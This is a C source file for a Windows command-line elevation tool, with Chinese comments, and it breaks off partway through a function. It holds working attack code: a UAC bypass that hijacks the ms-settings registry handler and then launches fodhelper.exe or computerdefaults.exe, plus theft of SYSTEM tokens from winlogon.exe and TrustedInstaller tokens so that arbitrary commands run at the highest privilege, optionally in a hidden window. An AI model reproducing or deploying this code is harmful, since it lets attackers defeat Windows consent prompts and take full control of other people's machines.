/*
 * TCU.c - UASTCmdup.exe (控制台提权引擎)
 *
 * 三级降级 UAC 绕过 + 命名事件同步 + 多语言支持
 *
 * 作者: 明明月明月11019 (哔哩哔哩)
 *       https://space.bilibili.com/3707056078982013
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0601
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <shellapi.h>
#include <sddl.h>
#include <userenv.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdarg.h>
#include <wchar.h>

#include "..\Common\translation.h"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "userenv.lib")

 /* ============================================================================
  * 常量
  * ============================================================================ */

static const WCHAR* APP_VERSION = L"2.0.0";
#define ELEVATE_TIMEOUT_MS 10000

/* ============================================================================
 * 数据结构
 * ============================================================================ */

typedef struct _LaunchOptions {
    WCHAR target[MAX_PATH * 4];
    WCHAR currentDirectory[MAX_PATH];
    int   userMode;      /* 0=管理员 1=SYSTEM 2=TI 3=当前用户 */
    int   privMode;      /* 0=默认 1=全部启用 2=全部禁用 */
    int   integMode;     /* 0=默认 1=System 2=High 3=Medium 4=Low */
    int   priorityMode;  /* 0=默认 1=实时 2=高 3=Above 4=Normal 5=Below 6=Idle */
    int   windowMode;    /* 0=显示 1=隐藏 2=最大 3=最小 */
    BOOL  wait;
} LaunchOptions;

typedef struct _ParsedCmdLine {
    LaunchOptions options;
    BOOL          showHelp;
    BOOL          showVersion;
    BOOL          valid;
    WCHAR         errorMsg[256];
} ParsedCmdLine;

/* ============================================================================
 * 全局状态
 * ============================================================================ */

static HANDLE g_hConsole = INVALID_HANDLE_VALUE;
static BOOL   g_bOwnConsole = FALSE;
static WCHAR  g_notifyEventName[256] = { 0 };

/* ============================================================================
 * 控制台
 * ============================================================================ */

static void InitConsole(void)
{
    HWND hConWnd;
    g_hConsole = INVALID_HANDLE_VALUE;

    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
        if (AllocConsole()) {
            g_bOwnConsole = TRUE;
        }
    }

    g_hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    if (g_hConsole == INVALID_HANDLE_VALUE || g_hConsole == NULL) {
        if (AllocConsole()) {
            g_bOwnConsole = TRUE;
            g_hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        }
    }

    if (g_bOwnConsole) {
        SetConsoleTitleW(Tr(L"cli.console.title"));
    }

    hConWnd = GetConsoleWindow();
    if (hConWnd) {
        ShowWindow(hConWnd, SW_SHOW);
        ShowWindow(hConWnd, SW_RESTORE);
        SetForegroundWindow(hConWnd);
        BringWindowToTop(hConWnd);
    }
}

static void Log(const WCHAR* fmt, ...)
{
    WCHAR buf[4096];
    DWORD written = 0;
    int len;
    va_list args;

    if (g_hConsole == INVALID_HANDLE_VALUE) return;
    va_start(args, fmt);
    len = _vsnwprintf_s(buf, _countof(buf), _TRUNCATE, fmt, args);
    va_end(args);
    if (len <= 0) return;
    WriteConsoleW(g_hConsole, buf, (DWORD)len, &written, NULL);
}

#define TR(key)         Log(L"%s\n", Tr(L##key))
#define TRF(key, ...)   do { \
    WCHAR _tr_buf[4096]; \
    swprintf_s(_tr_buf, _countof(_tr_buf), Tr(L##key), __VA_ARGS__); \
    Log(L"%s\n", _tr_buf); \
} while(0)

static void NotifyParentIfNeeded(void)
{
    HANDLE hEvt;
    if (!g_notifyEventName[0]) return;
    hEvt = OpenEventW(EVENT_MODIFY_STATE, FALSE, g_notifyEventName);
    if (hEvt) { SetEvent(hEvt); CloseHandle(hEvt); }
}

static void PauseOnError(int exitCode)
{
    HANDLE hIn;
    DWORD mode = 0, read = 0;
    WCHAR buf[2];

    if (exitCode == 0) return;
    if (!g_bOwnConsole) return;
    if (g_hConsole == INVALID_HANDLE_VALUE) return;

    Log(L"\n[!] Exit code: %d\n", exitCode);
    Log(L"[!] Press any key to close...\n");

    hIn = GetStdHandle(STD_INPUT_HANDLE);
    GetConsoleMode(hIn, &mode);
    SetConsoleMode(hIn, mode & ~ENABLE_ECHO_INPUT);
    ReadConsoleW(hIn, buf, 1, &read, NULL);
    SetConsoleMode(hIn, mode);
}

/* ============================================================================
 * 通用工具
 * ============================================================================ */

static BOOL StartsWithICase(const WCHAR* str, const WCHAR* prefix)
{
    size_t n = wcslen(prefix);
    if (wcslen(str) < n) return FALSE;
    return _wcsnicmp(str, prefix, n) == 0;
}

static void ToUpperW(WCHAR* s) { for (; *s; s++) *s = (WCHAR)towupper(*s); }

static BOOL ExtractValue(const WCHAR* arg, const WCHAR* key, WCHAR* out, size_t cch)
{
    size_t kn = wcslen(key);
    WCHAR sep;
    if (wcslen(arg) <= kn) return FALSE;
    sep = arg[kn];
    if (sep != L':' && sep != L'=') return FALSE;
    wcsncpy_s(out, cch, arg + kn + 1, _TRUNCATE);
    return TRUE;
}

/* ============================================================================
 * 提权核心
 * ============================================================================ */

static BOOL EnablePrivilege(LPCWSTR name)
{
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    BOOL ok;
    DWORD err;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!LookupPrivilegeValueW(NULL, name, &luid)) { CloseHandle(hToken); return FALSE; }

    ZeroMemory(&tp, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    err = GetLastError();
    CloseHandle(hToken);
    return ok && err == ERROR_SUCCESS;
}

static BOOL IsCurrentProcessAdmin(void)
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuth, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

static DWORD FindProcessId(LPCWSTR name)
{
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    if (snap == INVALID_HANDLE_VALUE) return 0;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static BOOL IsProcessPathEqual(HANDLE hProcess, LPCWSTR targetPath)
{
    WCHAR buf[MAX_PATH * 2] = { 0 };
    DWORD size = _countof(buf);
    if (!QueryFullProcessImageNameW(hProcess, 0, buf, &size)) return FALSE;
    return _wcsicmp(buf, targetPath) == 0;
}

static BOOL HasAdminSibling(LPCWSTR selfPath, DWORD myPid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    BOOL found = FALSE;
    if (snap == INVALID_HANDLE_VALUE) return FALSE;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            HANDLE hProc;
            HANDLE hToken = NULL;
            TOKEN_ELEVATION elevation;
            DWORD retLen = 0;
            if (pe.th32ProcessID == myPid) continue;
            hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            if (IsProcessPathEqual(hProc, selfPath)) {
                if (OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                    ZeroMemory(&elevation, sizeof(elevation));
                    if (GetTokenInformation(hToken, TokenElevation,
                        &elevation, sizeof(elevation), &retLen)) {
                        if (elevation.TokenIsElevated) found = TRUE;
                    }
                    CloseHandle(hToken);
                }
            }
            CloseHandle(hProc);
            if (found) break;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

/* ============================================================================
 * UAC 绕过
 * ============================================================================ */

static const WCHAR* MS_SETTINGS_KEY = L"Software\\Classes\\ms-settings";

static void RestoreRegistry(void)
{
    RegDeleteTreeW(HKEY_CURRENT_USER, MS_SETTINGS_KEY);
}

static BOOL TryBypassWith(LPCWSTR triggerExe, LPCWSTR originalCmdLine,
    DWORD myPid, LPCWSTR selfPath)
{
    WCHAR eventName[256];
    WCHAR cmdLine[MAX_PATH * 10];
    WCHAR sysDir[MAX_PATH];
    WCHAR triggerPath[MAX_PATH * 2];
    HANDLE hEvent = NULL;
    HKEY hKey = NULL;
    LSTATUS st;
    SHELLEXECUTEINFOW sei;
    BOOL launched;
    BOOL success;
    DWORD wr;

    swprintf_s(eventName, _countof(eventName),
        L"Local\\UASTEvt_%lu_%lu", myPid, GetTickCount());

    hEvent = CreateEventW(NULL, TRUE, FALSE, eventName);
    if (!hEvent) return FALSE;

    swprintf_s(cmdLine, _countof(cmdLine),
        L"\"%s\" --notify \"%s\"", selfPath, eventName);
    if (originalCmdLine && *originalCmdLine) {
        wcscat_s(cmdLine, _countof(cmdLine), L" ");
        wcscat_s(cmdLine, _countof(cmdLine), originalCmdLine);
    }

    st = RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\Shell\\Open\\command",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (st != ERROR_SUCCESS) {
        TRF("cli.reg_fail", st);
        CloseHandle(hEvent);
        return FALSE;
    }

    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        (BYTE*)cmdLine, (DWORD)((wcslen(cmdLine) + 1) * sizeof(WCHAR)));
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
        (BYTE*)L"", sizeof(WCHAR));
    RegCloseKey(hKey);

    TR("cli.reg_written");
    TRF("cli.event", eventName);
    TRF("cli.cmdline", cmdLine);

    GetSystemDirectoryW(sysDir, MAX_PATH);
    swprintf_s(triggerPath, MAX_PATH * 2, L"%s\\%s", sysDir, triggerExe);

    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC;
    sei.lpVerb = L"open";
    sei.lpFile = triggerPath;
    sei.nShow = SW_SHOWNORMAL;

    launched = ShellExecuteExW(&sei);
    if (sei.hProcess) CloseHandle(sei.hProcess);

    if (!launched) {
        TRF("cli.start_fail", triggerExe, GetLastError());
        RestoreRegistry();
        CloseHandle(hEvent);
        return FALSE;
    }
    TRF("cli.started", triggerExe);

    TRF("cli.waiting", ELEVATE_TIMEOUT_MS / 1000);
    wr = WaitForSingleObject(hEvent, ELEVATE_TIMEOUT_MS);
    success = (wr == WAIT_OBJECT_0);

    RestoreRegistry();
    CloseHandle(hEvent);
    TR("cli.reg_cleaned");

    if (success) TR("cli.notified");
    else TR("cli.timeout");

    return success;
}

static BOOL TryShellExecuteRunAs(LPCWSTR originalCmdLine)
{
    WCHAR selfPath[MAX_PATH];
    SHELLEXECUTEINFOW sei;
    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH)) return FALSE;

    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";
    sei.lpFile = selfPath;
    sei.lpParameters = originalCmdLine;
    sei.nShow = SW_SHOWNORMAL;

    if (!ShellExecuteExW(&sei)) {
        TRF("cli.runas_fail", GetLastError());
        return FALSE;
    }
    TR("cli.runas_triggered");
    if (sei.hProcess) CloseHandle(sei.hProcess);
    return TRUE;
}

static BOOL TryElevateWithFallback(LPCWSTR originalCmdLine, LPCWSTR selfPath)
{
    DWORD myPid = GetCurrentProcessId();

    TR("cli.try.fodhelper");
    if (TryBypassWith(L"fodhelper.exe", originalCmdLine, myPid, selfPath))
        return TRUE;
    if (HasAdminSibling(selfPath, myPid)) return TRUE;

    TR("cli.try.computerdefaults");
    if (TryBypassWith(L"computerdefaults.exe", originalCmdLine, myPid, selfPath))
        return TRUE;
    if (HasAdminSibling(selfPath, myPid)) return TRUE;

    TR("cli.try.runas");
    if (TryShellExecuteRunAs(originalCmdLine)) return TRUE;

    TR("cli.all_failed");
    return FALSE;
}

/* ============================================================================
 * 令牌
 * ============================================================================ */

static HANDLE GetImpersonationTokenFromWinlogon(void)
{
    DWORD pid = FindProcessId(L"winlogon.exe");
    HANDLE hProc, hToken, hDup;
    if (!pid) return NULL;
    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return NULL;
    hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc); return NULL;
    }
    CloseHandle(hProc);
    hDup = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenImpersonation, &hDup)) {
        CloseHandle(hToken); return NULL;
    }
    CloseHandle(hToken);
    return hDup;
}

static HANDLE GetSystemPrimaryToken(void)
{
    DWORD pid = FindProcessId(L"winlogon.exe");
    HANDLE hProc, hToken, hPrimary;
    if (!pid) return NULL;
    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return NULL;
    hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc); return NULL;
    }
    CloseHandle(hProc);
    hPrimary = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenPrimary, &hPrimary)) {
        CloseHandle(hToken); return NULL;
    }
    CloseHandle(hToken);
    return hPrimary;
}

static BOOL StartTrustedInstallerService(void)
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    SC_HANDLE hSvc;
    SERVICE_STATUS status;
    BOOL ok;
    DWORD err;
    if (!hSCM) return FALSE;
    hSvc = OpenServiceW(hSCM, L"TrustedInstaller",
        SERVICE_QUERY_STATUS | SERVICE_START);
    if (!hSvc) { CloseServiceHandle(hSCM); return FALSE; }
    ZeroMemory(&status, sizeof(status));
    if (QueryServiceStatus(hSvc, &status) &&
        status.dwCurrentState == SERVICE_RUNNING) {
        CloseServiceHandle(hSvc); CloseServiceHandle(hSCM); return TRUE;
    }
    ok = StartServiceW(hSvc, 0, NULL);
    err = GetLastError();
    CloseServiceHandle(hSvc); CloseServiceHandle(hSCM);
    return ok || err == ERROR_SERVICE_ALREADY_RUNNING;
}

static HANDLE GetTrustedInstallerToken(void)
{
    DWORD pid = 0;
    int i;
    HANDLE hProc, hToken, hPrimary;
    for (i = 0; i < 30; i++) {
        pid = FindProcessId(L"TrustedInstaller.exe");
        if (pid) break;
        Sleep(500);
    }
    if (!pid) return NULL;
    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return NULL;
    hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc); return NULL;
    }
    CloseHandle(hProc);
    hPrimary = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenPrimary, &hPrimary)) {
        CloseHandle(hToken); return NULL;
    }
    CloseHandle(hToken);
    return hPrimary;
}

static void EnableAllTokenPrivileges(HANDLE hToken)
{
    DWORD size = 0;
    PTOKEN_PRIVILEGES p;
    DWORD i;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &size);
    if (!size) return;
    p = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, size);
    if (!p) return;
    if (GetTokenInformation(hToken, TokenPrivileges, p, size, &size)) {
        for (i = 0; i < p->PrivilegeCount; i++)
            p->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, p, 0, NULL, NULL);
    }
    LocalFree(p);
}

static void DisableAllTokenPrivileges(HANDLE hToken)
{
    DWORD size = 0;
    PTOKEN_PRIVILEGES p;
    DWORD i;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &size);
    if (!size) return;
    p = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, size);
    if (!p) return;
    if (GetTokenInformation(hToken, TokenPrivileges, p, size, &size)) {
        for (i = 0; i < p->PrivilegeCount; i++)
            p->Privileges[i].Attributes = 0;
        AdjustTokenPrivileges(hToken, FALSE, p, 0, NULL, NULL);
    }
    LocalFree(p);
}

static BOOL SetTokenIntegrity(HANDLE hToken, LPCWSTR sidStr)
{
    PSID sid = NULL;
    TOKEN_MANDATORY_LABEL tml;
    DWORD size;
    BOOL ok;
    if (!ConvertStringSidToSidW(sidStr, &sid)) return FALSE;
    ZeroMemory(&tml, sizeof(tml));
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    tml.Label.Sid = sid;
    size = sizeof(tml) + GetLengthSid(sid);
    ok = SetTokenInformation(hToken, TokenIntegrityLevel, &tml, size);
    LocalFree(sid);
    return ok;
}

static void AdjustTokenForOptions(HANDLE hToken, const LaunchOptions* opt)
{
    DWORD sid;
    if (opt->privMode == 1)       EnableAllTokenPrivileges(hToken);
    else if (opt->privMode == 2)  DisableAllTokenPrivileges(hToken);

    switch (opt->integMode) {
    case 1: SetTokenIntegrity(hToken, L"S-1-16-16384"); break;
    case 2: SetTokenIntegrity(hToken, L"S-1-16-12288"); break;
    case 3: SetTokenIntegrity(hToken, L"S-1-16-8192");  break;
    case 4: SetTokenIntegrity(hToken, L"S-1-16-4096");  break;
    }

    sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    SetTokenInformation(hToken, TokenSessionId, &sid, sizeof(sid));
}

static HANDLE GetTargetToken(int userMode, WCHAR* errBuf, DWORD errSize)
{
    if (userMode == 0 || userMode == 3) {
        HANDLE hToken = NULL;
        HANDLE hPrimary = NULL;
        if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            wcsncpy_s(errBuf, errSize, L"OpenProcessToken failed", _TRUNCATE);
            return NULL;
        }
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
            SecurityImpersonation, TokenPrimary, &hPrimary)) {
            wcsncpy_s(errBuf, errSize, L"DuplicateTokenEx failed", _TRUNCATE);
            CloseHandle(hToken);
            return NULL;
        }
        CloseHandle(hToken);
        return hPrimary;
    }
    if (userMode == 1) {
        HANDLE hPrimary = GetSystemPrimaryToken();
        if (!hPrimary) wcsncpy_s(errBuf, errSize, L"Failed to get SYSTEM token", _TRUNCATE);
        return hPrimary;
    }
    if (userMode == 2) {
        HANDLE hSysImp = GetImpersonationTokenFromWinlogon();
        HANDLE hPrimary;
        if (!hSysImp) {
            wcsncpy_s(errBuf, errSize, L"Failed to get SYSTEM impersonation token", _TRUNCATE);
            return NULL;
        }
        if (!ImpersonateLoggedOnUser(hSysImp)) {
            wcsncpy_s(errBuf, errSize, L"ImpersonateLoggedOnUser failed", _TRUNCATE);
            CloseHandle(hSysImp);
            return NULL;
        }
        StartTrustedInstallerService();
        hPrimary = GetTrustedInstallerToken();
        RevertToSelf();
        CloseHandle(hSysImp);
        if (!hPrimary)
            wcsncpy_s(errBuf, errSize, L"Failed to get TrustedInstaller token", _TRUNCATE);
        return hPrimary;
    }
    wcsncpy_s(errBuf, errSize, L"Unknown user mode", _TRUNCATE);
    return NULL;
}

static DWORD GetPriorityClassValue(int mode)
{
    switch (mode) {
    case 1: return REALTIME_PRIORITY_CLASS;
    case 2: return HIGH_PRIORITY_CLASS;
    case 3: return ABOVE_NORMAL_PRIORITY_CLASS;
    case 4: return NORMAL_PRIORITY_CLASS;
    case 5: return BELOW_NORMAL_PRIORITY_CLASS;
    case 6: return IDLE_PRIORITY_CLASS;
    }
    return 0;
}

static int GetShowWindowValue(int mode)
{
    switch (mode) {
    case 0: return SW_SHOWNORMAL;
    case 1: return SW_HIDE;
    case 2: return SW_SHOWMAXIMIZED;
    case 3: return SW_SHOWMINIMIZED;
    }
    return SW_SHOWNORMAL;
}

static BOOL ExecuteWithToken(HANDLE hToken, const LaunchOptions* opt,
    WCHAR* errBuf, DWORD errSize)
{
    WCHAR cmdLine[MAX_PATH * 6];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR workDir[MAX_PATH];
    LPVOID env = NULL;
    DWORD prio;
    BOOL ok;

    swprintf_s(cmdLine, _countof(cmdLine), L"cmd.exe /c \"%s\"", opt->target);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = (WORD)GetShowWindowValue(opt->windowMode);
    ZeroMemory(&pi, sizeof(pi));

    if (opt->currentDirectory[0])
        wcsncpy_s(workDir, MAX_PATH, opt->currentDirectory, _TRUNCATE);
    else
        GetCurrentDirectoryW(MAX_PATH, workDir);

    CreateEnvironmentBlock(&env, hToken, FALSE);

    ok = CreateProcessWithTokenW(hToken, 0, NULL, cmdLine,
        CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
        env, workDir, &si, &pi);

    if (!ok) {
        swprintf_s(errBuf, errSize,
            L"CreateProcessWithTokenW failed, error %lu", GetLastError());
        if (env) DestroyEnvironmentBlock(env);
        return FALSE;
    }

    TRF("cli.proc_started", pi.dwProcessId);

    prio = GetPriorityClassValue(opt->priorityMode);
    if (prio) SetPriorityClass(pi.hProcess, prio);

    if (opt->wait) WaitForSingleObject(pi.hProcess, INFINITE);

    if (env) DestroyEnvironmentBlock(env);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

/* ============================================================================
 * 命令行解析
 * ============================================================================ */

static ParsedCmdLine ParseCommandLine(int argc, wchar_t** argv)
{
    ParsedCmdLine p;
    BOOL inTarget = FALSE;
    int i;

    ZeroMemory(&p, sizeof(p));
    p.valid = TRUE;
    if (argc <= 1) return p;

    for (i = 1; i < argc; i++) {
        WCHAR arg[MAX_PATH * 2];
        WCHAR opt[MAX_PATH * 2];
        WCHAR optUpper[MAX_PATH * 2];
        WCHAR value[MAX_PATH];
        WCHAR valueUpper[MAX_PATH];
        const WCHAR* key = NULL;
        BOOL isOption = FALSE;

        wcsncpy_s(arg, _countof(arg), argv[i], _TRUNCATE);

        if (inTarget) {
            if (p.options.target[0])
                wcscat_s(p.options.target, _countof(p.options.target), L" ");
            wcscat_s(p.options.target, _countof(p.options.target), arg);
            continue;
        }

        if (arg[0] == L'-' || arg[0] == L'/') isOption = TRUE;
        if (!isOption) {
            inTarget = TRUE;
            wcsncpy_s(p.options.target, _countof(p.options.target), arg, _TRUNCATE);
            continue;
        }

        if (arg[0] == L'-' && arg[1] == L'-')
            wcsncpy_s(opt, _countof(opt), arg + 2, _TRUNCATE);
        else
            wcsncpy_s(opt, _countof(opt), arg + 1, _TRUNCATE);

        wcsncpy_s(optUpper, _countof(optUpper), opt, _TRUNCATE);
        ToUpperW(optUpper);

        if (wcscmp(optUpper, L"WAIT") == 0) { p.options.wait = TRUE; continue; }
        if (wcscmp(optUpper, L"VERSION") == 0) { p.showVersion = TRUE; continue; }
        if (wcscmp(optUpper, L"?") == 0 ||
            wcscmp(optUpper, L"H") == 0 ||
            wcscmp(optUpper, L"HELP") == 0) {
            p.showHelp = TRUE; continue;
        }

        /* 内部参数 */
        if (wcscmp(optUpper, L"NOTIFY") == 0) {
            if (i + 1 < argc) {
                wcsncpy_s(g_notifyEventName, _countof(g_notifyEventName),
                    argv[i + 1], _TRUNCATE);
                i++;
            }
            continue;
        }

        /* -language 跳过 (在主流程已处理) */
        if (wcscmp(optUpper, L"LANGUAGE") == 0) {
            i++;
            continue;
        }

        if (StartsWithICase(opt, L"U") &&
            (wcslen(opt) == 1 || opt[1] == L':' || opt[1] == L'=')) {
            key = L"U";
            if (!ExtractValue(opt, L"U", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-U missing arg");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"P") &&
            (wcslen(opt) == 1 || opt[1] == L':' || opt[1] == L'=')) {
            key = L"P";
            if (!ExtractValue(opt, L"P", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-P missing arg");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"M") &&
            (wcslen(opt) == 1 || opt[1] == L':' || opt[1] == L'=')) {
            key = L"M";
            if (!ExtractValue(opt, L"M", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-M missing arg");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"Priority")) {
            key = L"Priority";
            if (!ExtractValue(opt, L"Priority", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-Priority missing arg");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"ShowWindowMode")) {
            key = L"ShowWindowMode";
            if (!ExtractValue(opt, L"ShowWindowMode", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-ShowWindowMode missing arg");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"CurrentDirectory")) {
            key = L"CurrentDirectory";
            if (!ExtractValue(opt, L"CurrentDirectory", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-CurrentDirectory missing arg");
                return p;
            }
        }
        else {
            p.valid = FALSE;
            swprintf_s(p.errorMsg, _countof(p.errorMsg), L"Unknown option: %s", arg);
            return p;
        }

        wcsncpy_s(valueUpper, _countof(valueUpper), value, _TRUNCATE);
        ToUpperW(valueUpper);

        if (wcscmp(key, L"U") == 0) {
            if (wcscmp(valueUpper, L"T") == 0)      p.options.userMode = 2;
            else if (wcscmp(valueUpper, L"S") == 0) p.options.userMode = 1;
            else if (wcscmp(valueUpper, L"C") == 0) p.options.userMode = 3;
            else if (wcscmp(valueUpper, L"E") == 0) p.options.userMode = 0;
            else if (wcscmp(valueUpper, L"P") == 0) p.options.userMode = 0;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-U invalid: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"P") == 0) {
            if (wcscmp(valueUpper, L"E") == 0)      p.options.privMode = 1;
            else if (wcscmp(valueUpper, L"D") == 0) p.options.privMode = 2;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-P invalid: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"M") == 0) {
            if (wcscmp(valueUpper, L"S") == 0)      p.options.integMode = 1;
            else if (wcscmp(valueUpper, L"H") == 0) p.options.integMode = 2;
            else if (wcscmp(valueUpper, L"M") == 0) p.options.integMode = 3;
            else if (wcscmp(valueUpper, L"L") == 0) p.options.integMode = 4;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-M invalid: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"Priority") == 0) {
            if (wcscmp(valueUpper, L"IDLE") == 0)             p.options.priorityMode = 6;
            else if (wcscmp(valueUpper, L"BELOWNORMAL") == 0) p.options.priorityMode = 5;
            else if (wcscmp(valueUpper, L"NORMAL") == 0)      p.options.priorityMode = 4;
            else if (wcscmp(valueUpper, L"ABOVENORMAL") == 0) p.options.priorityMode = 3;
            else if (wcscmp(valueUpper, L"HIGH") == 0)        p.options.priorityMode = 2;
            else if (wcscmp(valueUpper, L"REALTIME") == 0)    p.options.priorityMode = 1;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-Priority invalid: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"ShowWindowMode") == 0) {
            if (wcscmp(valueUpper, L"SHOW") == 0)          p.options.windowMode = 0;
            else if (wcscmp(valueUpper, L"HIDE") == 0)     p.options.windowMode = 1;
            else if (wcscmp(valueUpper, L"MAXIMIZE") == 0) p.options.windowMode = 2;
            else if (wcscmp(valueUpper, L"MINIMIZE") == 0) p.options.windowMode = 3;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-ShowWindowMode invalid: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"CurrentDirectory") == 0) {
            wcsncpy_s(p.options.currentDirectory, MAX_PATH, value, _TRUNCATE);
        }
    }

    return p;
}

/* ============================================================================
 * 主流程
 * ============================================================================ */

 /* 处理 -language 参数, 返回 -1 表示未处理, 0 表示已处理并应退出 */
static int HandleLanguageArg(int argc, wchar_t** argv)
{
    int i;
    for (i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"-language") == 0 && i + 1 < argc) {
            WCHAR opt[256];
            WCHAR* p;
            wcsncpy_s(opt, _countof(opt), argv[i + 1], _TRUNCATE);
            p = opt;
            if (*p == L'/' || *p == L'-') p++;

            if (wcscmp(p, L"?") == 0) {
                Log(L"%s\n", Tr(L"cli.lang.help"));
                Log(L"%s\n", Tr(L"cli.lang.list_header"));
                for (int k = 0; k < TrLanguageCount(); k++)
                    Log(L"  %s  (%s)\n", TrLanguageCode(k), TrLanguageName(k));
                {
                    WCHAR buf[128];
                    swprintf_s(buf, 128, Tr(L"cli.lang.current_mark"), TrCurrentCode());
                    Log(L"%s\n", buf);
                }
                return 0;
            }

